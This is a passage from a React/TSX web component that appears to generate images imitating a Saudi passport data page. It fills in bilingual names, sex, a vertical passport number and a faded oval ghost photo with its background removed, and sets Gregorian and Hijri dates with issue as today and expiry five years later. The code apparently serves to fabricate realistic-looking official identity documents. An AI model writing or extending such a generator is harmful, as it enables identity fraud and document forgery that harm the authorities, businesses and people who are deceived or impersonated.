                  <span className="absolute top-[29%] right-[14%] text-[#0D5C3D] text-sm font-bold" style={{fontFamily: 'Arial, sans-serif'}}>الاسم/ <span className="text-black">{arabicFirstName}{arabicFirstName && arabicSecondName ? (gender === 'ذكر' ? ' بن ' : ' بنت ') : ''}{arabicSecondName}{arabicSecondName && arabicThirdName ? ' بن ' : ''}{arabicThirdName}{arabicThirdName && arabicFourthName ? ' ' : ''}{arabicFourthName}</span></span>
                  <span className="absolute top-[33%] left-[30%] text-[#0D5C3D] text-sm font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Name/ <span className="text-black">{englishFourthName ? englishFourthName.toUpperCase() + ', ' : ''}{englishFirstName ? englishFirstName.toUpperCase() + ' ' : ''}{englishSecondName ? englishSecondName.toUpperCase() + ' ' : ''}{englishThirdName ? englishThirdName.charAt(0).toUpperCase() : ''}</span></span>
                  <span className="absolute top-[38%] left-[30%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Nationality/الجنسية</span>
                  <span className="absolute top-[42%] left-[30%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>SAUDI ARABIA السعودية</span>
                  <span className="absolute top-[46%] left-[30%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Date of Birth</span>
                <span className="absolute top-[46%] left-[48%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>تاريخ الميلاد</span>
                  {/* Oval photo on the right side */}
                  {(photoNoBg || photoPreview) && (
                    <div className="absolute top-[38%] right-[30%] w-[12%] h-[28%] overflow-hidden" style={{borderRadius: '50%', border: '2px solid #808080', display: 'flex', alignItems: 'center', justifyContent: 'center'}}>
                      <img 
                        src={photoNoBg || photoPreview} 
                        alt="" 
                        className="object-cover" style={{width: '80%', height: '80%', objectPosition: 'center center', opacity: 0.5}}
                      />
                    </div>
                  )}
                  {/* Vertical passport number next to oval photo */}
                  <div className="absolute top-[38%] right-[28%] h-[32%] flex flex-col justify-start items-center">
                    {passportNumber.split('').map((char, index) => (
                      <span key={index} className="text-black text-xs font-bold" style={{lineHeight: '1'}}>
                        {char}
                      </span>
                    ))}
                  </div>
                  {/* Issuing Authority */}
                  <span className="absolute top-[68%] right-[14%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Issuing Authority/ مكان الإصدار</span>
                  <span className="absolute top-[38%] left-[48%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Sex/الجنس</span>
                  <span className="absolute top-[42%] left-[48%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>{gender === 'ذكر' ? 'M' : gender === 'أنثى' ? 'F' : ''}</span>
                  <span className="absolute top-[42%] left-[52%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>{gender}</span>
                  <span className="absolute top-[50%] left-[30%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>
                    {calendarType === 'gregorian' && dateOfBirth 
                      ? (() => {
                            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                            const d = dateOfBirth.getDate();
                            const m = dateOfBirth.getMonth();
                            const y = dateOfBirth.getFullYear();
                            return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                          })() 
                      : calendarType === 'hijri' && hijriDate.day && hijriDate.month && hijriDate.year 
                        ? (() => {
                            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                            const hY = parseInt(hijriDate.year);
                            const hM = parseInt(hijriDate.month);
                            const hD = parseInt(hijriDate.day);
                            const jd = Math.floor((11 * hY + 3) / 30) + 354 * hY + 30 * hM - Math.floor((hM - 1) / 2) + hD + 1948440 - 385;
                            const l = jd + 68569;
                            const n = Math.floor(4 * l / 146097);
                            const l2 = l - Math.floor((146097 * n + 3) / 4);
                            const i = Math.floor(4000 * (l2 + 1) / 1461001);
                            const l3 = l2 - Math.floor(1461 * i / 4) + 31;
                            const j = Math.floor(80 * l3 / 2447);
                            const gD = l3 - Math.floor(2447 * j / 80);
                            const l4 = Math.floor(j / 11);
                            const gM = j + 2 - 12 * l4;
                            const gY = 100 * (n - 49) + i + l4;
                            return `${String(gD).padStart(2, '0')} ${months[gM - 1]} ${gY}`;
                          })()
                        : ''}
                  </span>
                  {/* Hijri Date of Birth */}
                  <span className="absolute top-[50%] left-[48%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'rtl'}}>
                    {calendarType === 'gregorian' && dateOfBirth 
                      ? (() => {
                            const gY = dateOfBirth.getFullYear();
                            const gM = dateOfBirth.getMonth() + 1;
                            const gD = dateOfBirth.getDate();
                            const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                            const l = jd - 1948440 + 10632;
                            const n = Math.floor((l - 1) / 10631);
                            const l2 = l - 10631 * n + 354;
                            const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                            const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                            const hM = Math.floor((24 * l3) / 709);
                            const hD = l3 - Math.floor((709 * hM) / 24);
                            const hY = 30 * n + j - 30;
                            const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                            return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                          })() 
                      : calendarType === 'hijri' && hijriDate.day && hijriDate.month && hijriDate.year 
                        ? (() => {
                            const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                            return `${toArabicNum(parseInt(hijriDate.year))}/${toArabicNum(String(parseInt(hijriDate.month)).padStart(2, '0'))}/${toArabicNum(String(parseInt(hijriDate.day)).padStart(2, '0'))}`;
                          })()
                        : ''}
                  </span>
                  <span className="absolute top-[54%] left-[30%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Date of Issue</span>
                  <span className="absolute top-[54%] left-[48%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>تاريخ الإصدار</span>
                  <span className="absolute top-[58%] left-[48%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'rtl'}}>
                    {(() => {
                      const today = new Date();
                      const gY = today.getFullYear();
                      const gM = today.getMonth() + 1;
                      const gD = today.getDate();
                      const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                      const l = jd - 1948440 + 10632;
                      const n = Math.floor((l - 1) / 10631);
                      const l2 = l - 10631 * n + 354;
                      const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                      const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                      const hM = Math.floor((24 * l3) / 709);
                      const hD = l3 - Math.floor((709 * hM) / 24);
                      const hY = 30 * n + j - 30;
                      const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                      return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                    })()}
                  </span>
                  <span className="absolute top-[58%] left-[30%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>
                    {(() => {
                      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                      const today = new Date();
                      const d = today.getDate();
                      const m = today.getMonth();
                      const y = today.getFullYear();
                      return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                    })()}
                  </span>
                  <span className="absolute top-[62%] left-[30%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>Date of Expiry</span>
                  <span className="absolute top-[62%] left-[48%] text-[#0D5C3D] text-xs" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>تاريخ الانتهاء</span>
                  <span className="absolute top-[66%] left-[48%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'rtl'}}>
                    {(() => {
                      const today = new Date();
                      const gY = today.getFullYear() + 5;
                      const gM = today.getMonth() + 1;
                      const gD = today.getDate();
                      const jd = Math.floor((1461 * (gY + 4800 + Math.floor((gM - 14) / 12))) / 4) + Math.floor((367 * (gM - 2 - 12 * Math.floor((gM - 14) / 12))) / 12) - Math.floor((3 * Math.floor((gY + 4900 + Math.floor((gM - 14) / 12)) / 100)) / 4) + gD - 32075;
                      const l = jd - 1948440 + 10632;
                      const n = Math.floor((l - 1) / 10631);
                      const l2 = l - 10631 * n + 354;
                      const j = Math.floor((10985 - l2) / 5316) * Math.floor((50 * l2) / 17719) + Math.floor(l2 / 5670) * Math.floor((43 * l2) / 15238);
                      const l3 = l2 - Math.floor((30 - j) / 15) * Math.floor((17719 * j) / 50) - Math.floor(j / 16) * Math.floor((15238 * j) / 43) + 29;
                      const hM = Math.floor((24 * l3) / 709);
                      const hD = l3 - Math.floor((709 * hM) / 24);
                      const hY = 30 * n + j - 30;
                      const toArabicNum = (num: number) => num.toString().replace(/[0-9]/g, d => '٠١٢٣٤٥٦٧٨٩'[parseInt(d)]);
                      return `${toArabicNum(hY)}/${toArabicNum(String(hM).padStart(2, '0'))}/${toArabicNum(String(hD).padStart(2, '0'))}`;
                    })()}
                  </span>
                  <span className="absolute top-[66%] left-[30%] text-black text-xs font-bold" style={{fontFamily: 'Arial, sans-serif', direction: 'ltr'}}>
                    {(() => {
                      const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                      const today = new Date();
                      const d = today.getDate();
                      const m = today.getMonth();
                      const y = today.getFullYear() + 5;
                      return `${String(d).padStart(2, '0')} ${months[m]} ${y}`;
                    })()}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Documents;
